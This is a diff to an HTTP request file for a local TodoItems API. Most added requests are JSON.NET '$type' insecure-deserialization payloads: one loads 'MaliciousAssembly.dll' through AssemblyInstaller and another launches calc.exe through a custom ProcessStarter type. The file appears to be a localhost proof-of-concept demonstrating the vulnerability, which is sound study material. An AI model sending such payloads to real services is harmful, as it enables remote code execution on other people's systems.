@@ -2,6 +2,21 @@ GET https://localhost:7040/api/TodoItems HTTP/1.1
 
 ###
 
+
+POST https://localhost:7040/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "walk dog1",
+  "isComplete": true,
+  "metadata":
+    {
+        "data2": 123
+    }
+}
+
+###
+
 POST https://localhost:7040/api/TodoItems HTTP/1.1
 content-type: application/json
 
@@ -19,17 +34,35 @@ content-type: application/json
 
 ###
 
+
 POST https://localhost:7040/api/TodoItems HTTP/1.1
 content-type: application/json
 
 {
-  "name": "walk dog2",
+  "name": "load assembly",
   "isComplete": true,
   "metadata":
     {
         "data2":  {"$type":"System.Configuration.Install.AssemblyInstaller, 
             System.Configuration.Install",
             "Path":"MaliciousAssembly.dll"}
+    }
+}
+
+###
+
+POST https://localhost:7040/api/TodoItems HTTP/1.1
+content-type: application/json
+
+{
+  "name": "launch calc",
+  "isComplete": true,
+  "metadata":
+    {
+        "data2":  {"$type":"MaliciousAssembly, 
+            MaliciousAssembly.ProcessStarter",
+            "ProcessLaunch":"calc.exe"
+            }
     }
 }
 
